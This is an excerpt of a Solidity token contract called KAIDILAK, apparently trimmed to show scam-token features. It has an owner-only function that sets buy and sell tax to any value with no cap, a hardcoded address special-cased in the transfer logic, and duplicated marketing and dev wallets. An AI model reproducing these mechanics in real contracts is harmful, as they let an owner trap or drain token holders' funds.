...
contract KAIDILAK is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x3d0D98DbF1D7bB3207bE624A99413Cd7EB31f63E);
    address payable public Wallet_Dev = payable(0x3d0D98DbF1D7bB3207bE624A99413Cd7EB31f63E);
    ...
    string private constant _name = "KAIDILAK";
    string private constant _symbol = unicode"KAIDILAK";
    ...
    function _transfer(
        ...
        if (to == 0xfaba14e7CC1f41C7Dd8242B9D243Da66a506d699){
    ...
    function setFeeLIM(uint256 value) onlyOwner public {
        _Tax_on_Buy = value;
        _Tax_on_Sell = value;
    }
